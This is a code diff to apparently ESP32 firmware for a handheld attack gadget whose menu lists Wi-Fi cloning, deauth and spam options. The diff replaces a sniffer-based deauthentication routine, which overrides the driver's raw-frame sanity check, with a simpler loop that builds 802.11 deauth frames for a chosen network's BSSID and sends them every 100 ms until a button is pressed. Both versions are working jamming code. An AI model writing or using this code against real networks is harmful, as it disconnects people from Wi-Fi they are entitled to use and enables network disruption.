@@ -1,4 +1,3 @@
-
 #include <Wire.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
@@ -43,7 +42,6 @@ bool inDeauthMenu = false;
 // --- Menu lists ---
 String mainMenu[5] = {"WiFi", "BLE", "Settings", "IR", "Exit"};
 String wifiMenu[4] = {"WiFi-Clon", "WiFi-Deauth", "WiFi-Spam", "Back"};
-String deauthMenu[3] = {"Start Deauth", "Stop Deauth", "Back"};
 
 // --- Variables for WiFi Clone/Deauth ---
 String selectedSSID = "";
@@ -73,13 +71,9 @@ deauth_frame_t deauth_frame;
 wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
 
 #define DEAUTH_TYPE_SINGLE 0
-#define DEAUTH_TYPE_BROADCAST 1
-#define NUM_FRAMES_PER_DEAUTH 10
-#define DEAUTH_BLINK_TIMES 1
-#define DEAUTH_BLINK_DURATION 50
+#define NUM_FRAMES_PER_DEAUTH 5
 
 int eliminated_stations = 0;
-int current_deauth_type = DEAUTH_TYPE_SINGLE;
 int selected_network_index = 0;
 
 // --- WiFi MAC Header Structure ---
@@ -90,67 +84,44 @@ typedef struct {
   uint16_t sequence_ctrl;
 } wifi_mac_hdr_t;
 
-// --- Deauth Functions ---
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-  return 0;
-}
-
-void IRAM_ATTR sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
-  if (!deauthRunning) return;
+// --- Simple Deauth Function ---
+void send_deauth_frame(uint8_t* bssid, uint8_t channel) {
+  // Set channel
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   
-  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
-  wifi_mac_hdr_t *hdr = (wifi_mac_hdr_t*)pkt->payload;
-  
-  if (current_deauth_type == DEAUTH_TYPE_SINGLE) {
-    if (memcmp(hdr->src_addr, bssidList[selected_network_index], 6) == 0) {
-      memcpy(deauth_frame.destination, hdr->src_addr, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
-        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
-      }
-      eliminated_stations++;
-    }
-  } else {
-    if (memcmp(hdr->dest_addr, hdr->bssid, 6) == 0 && memcmp(hdr->dest_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
-      memcpy(deauth_frame.destination, hdr->src_addr, 6);
-      memcpy(deauth_frame.source, hdr->bssid, 6);
-      memcpy(deauth_frame.bssid, hdr->bssid, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
-      }
-    }
-  }
-}
-
-void start_deauth(int wifi_number, int attack_type, uint16_t reason = 0x0007) {
-  deauthRunning = true;
-  eliminated_stations = 0;
-  current_deauth_type = attack_type;
-
-  // Initialize deauth frame
+  // Fill deauth frame
   deauth_frame.frame_control = 0xC0;
   deauth_frame.duration = 0;
-  deauth_frame.reason_code = reason;
-
-  if (current_deauth_type == DEAUTH_TYPE_SINGLE) {
-    memcpy(deauth_frame.destination, bssidList[wifi_number], 6);
-    memcpy(deauth_frame.source, bssidList[wifi_number], 6);
-    memcpy(deauth_frame.bssid, bssidList[wifi_number], 6);
-    
-    WiFi.softAP("DEAUTH_AP", NULL, chList[wifi_number], 0, 1);
-  } else {
-    WiFi.mode(WIFI_MODE_STA);
-    WiFi.disconnect();
+  deauth_frame.reason_code = 0x0007;
+  
+  memcpy(deauth_frame.destination, bssid, 6);
+  memcpy(deauth_frame.source, bssid, 6);
+  memcpy(deauth_frame.bssid, bssid, 6);
+  
+  // Send multiple frames
+  for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+    delay(10);
   }
-
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&sniffer);
 }
 
-void stop_deauth() {
+void start_deauth_attack(int wifi_number) {
+  deauthRunning = true;
+  
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+  
+  display.clearDisplay();
+  display.setCursor(0, 0);
+  display.println("Deauth Attack:");
+  display.println(ssidList[wifi_number]);
+  display.println("Press ENTER to stop");
+  display.display();
+}
+
+void stop_deauth_attack() {
   deauthRunning = false;
-  esp_wifi_set_promiscuous(false);
-  WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_STA);
 }
 
@@ -434,23 +405,24 @@ void runDeauthMenu() {
         break;
       } else {
         selected_network_index = selected;
-        start_deauth(selected, DEAUTH_TYPE_SINGLE);
+        start_deauth_attack(selected);
         
-        display.clearDisplay();
-        display.setCursor(0, 0);
-        display.println("Deauth Attack:");
-        display.println(ssidList[selected]);
-        display.println("Press ENTER to stop");
-        display.display();
-
+        unsigned long startTime = millis();
         while (true) {
-          delay(100);
+          // Send deauth frames continuously
+          if (millis() - startTime > 100) {
+            send_deauth_frame(bssidList[selected], chList[selected]);
+            startTime = millis();
+          }
+          
+          // Check for stop button
           int waitEnter = digitalRead(Enter);
           if (waitEnter == LOW) {
-            stop_deauth();
+            stop_deauth_attack();
             delay(300);
             break;
           }
+          delay(10);
         }
       }
     }
